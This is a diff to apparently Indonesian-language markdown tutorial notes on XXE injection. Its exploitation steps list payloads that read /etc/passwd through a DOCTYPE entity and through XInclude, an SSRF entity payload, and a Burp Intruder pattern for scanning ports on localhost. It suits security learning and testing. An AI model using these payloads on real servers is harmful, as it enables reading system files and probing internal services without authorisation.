@@ -15,11 +15,11 @@ Sebelum memahami XXE, kita harus memiliki pengetahuan dasar XML, DTD dan entity.
   - Cara cepat menemukan XML endpoint adalah automasi
   
 - **Exploitation**
-  - Retrieve Files. Inject [payload](https://github.com/payloadbox/xxe-injection-payload-list) ke bagian !DOCTYPE
+  - Retrieve Files. Inject [payload](https://github.com/payloadbox/xxe-injection-payload-list) ke bagian `!DOCTYPE`
     > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>`
   - Exploiting to perform Server Side Request Forgery (SSRF). Sama seperti cara di atas. Tapi jika sebelumnya menggunakan `file`, untuk exploitasi ini menggunakan `http` dilanjutkan dengan ip server
     > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://1”> ]>`
-  - Jika tidak bisa modifikasi !DOCTYPE, gunakan `XInclude`
+  - Jika tidak bisa modifikasi `!DOCTYPE`, gunakan `XInclude` (baca SOAP dan XML namespace)
     > `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
   - Test local machine port (gunakan burp intruder). Brute port dari ip local, lalu cek bergantian `http` dan `https`
     > `<!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">`
